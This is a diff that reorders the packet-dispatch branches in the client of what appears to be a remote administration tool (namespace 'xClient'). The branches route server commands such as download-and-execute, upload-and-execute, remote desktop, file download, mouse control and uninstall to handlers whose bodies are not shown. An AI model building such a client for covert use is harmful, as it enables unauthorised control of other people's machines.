@@ -187,6 +187,14 @@ namespace xClient
             {
                 CommandHandler.HandleInitializeCommand((Core.Packets.ServerPackets.InitializeCommand)packet, client);
             }
+            else if (type == typeof(Core.Packets.ServerPackets.Desktop))
+            {
+                CommandHandler.HandleRemoteDesktop((Core.Packets.ServerPackets.Desktop)packet, client);
+            }
+            else if (type == typeof(Core.Packets.ServerPackets.DownloadFile))
+            {
+                CommandHandler.HandleDownloadFile((Core.Packets.ServerPackets.DownloadFile)packet, client);
+            }
             else if (type == typeof(Core.Packets.ServerPackets.DownloadAndExecute))
             {
                 CommandHandler.HandleDownloadAndExecuteCommand((Core.Packets.ServerPackets.DownloadAndExecute)packet, client);
@@ -195,28 +203,28 @@ namespace xClient
             {
                 CommandHandler.HandleUploadAndExecute((Core.Packets.ServerPackets.UploadAndExecute)packet, client);
             }
-            else if (type == typeof(Core.Packets.ServerPackets.Disconnect))
+            else if (type == typeof(Core.Packets.ServerPackets.Update))
             {
-                CommandHandler.CloseShell();
-                SystemCore.Disconnect = true;
-                client.Disconnect();
+                CommandHandler.HandleUpdate((Core.Packets.ServerPackets.Update)packet, client);
             }
             else if (type == typeof(Core.Packets.ServerPackets.Reconnect))
             {
                 CommandHandler.CloseShell();
                 client.Disconnect();
             }
-            else if (type == typeof(Core.Packets.ServerPackets.Uninstall))
+            else if (type == typeof(Core.Packets.ServerPackets.Disconnect))
             {
-                CommandHandler.HandleUninstall((Core.Packets.ServerPackets.Uninstall)packet, client);
-            }
-            else if (type == typeof(Core.Packets.ServerPackets.Desktop))
-            {
-                CommandHandler.HandleRemoteDesktop((Core.Packets.ServerPackets.Desktop)packet, client);
+                CommandHandler.CloseShell();
+                SystemCore.Disconnect = true;
+                client.Disconnect();
             }
             else if (type == typeof(Core.Packets.ServerPackets.GetProcesses))
             {
                 CommandHandler.HandleGetProcesses((Core.Packets.ServerPackets.GetProcesses)packet, client);
+            }
+            else if (type == typeof(Core.Packets.ServerPackets.Uninstall))
+            {
+                CommandHandler.HandleUninstall((Core.Packets.ServerPackets.Uninstall)packet, client);
             }
             else if (type == typeof(Core.Packets.ServerPackets.KillProcess))
             {
@@ -234,10 +242,6 @@ namespace xClient
             {
                 CommandHandler.HandleDirectory((Core.Packets.ServerPackets.Directory)packet, client);
             }
-            else if (type == typeof(Core.Packets.ServerPackets.DownloadFile))
-            {
-                CommandHandler.HandleDownloadFile((Core.Packets.ServerPackets.DownloadFile)packet, client);
-            }
             else if (type == typeof(Core.Packets.ServerPackets.MouseClick))
             {
                 CommandHandler.HandleMouseClick((Core.Packets.ServerPackets.MouseClick)packet, client);
@@ -253,10 +257,6 @@ namespace xClient
             else if (type == typeof(Core.Packets.ServerPackets.ShowMessageBox))
             {
                 CommandHandler.HandleShowMessageBox((Core.Packets.ServerPackets.ShowMessageBox)packet, client);
-            }
-            else if (type == typeof(Core.Packets.ServerPackets.Update))
-            {
-                CommandHandler.HandleUpdate((Core.Packets.ServerPackets.Update)packet, client);
             }
             else if (type == typeof(Core.Packets.ServerPackets.Monitors))
             {
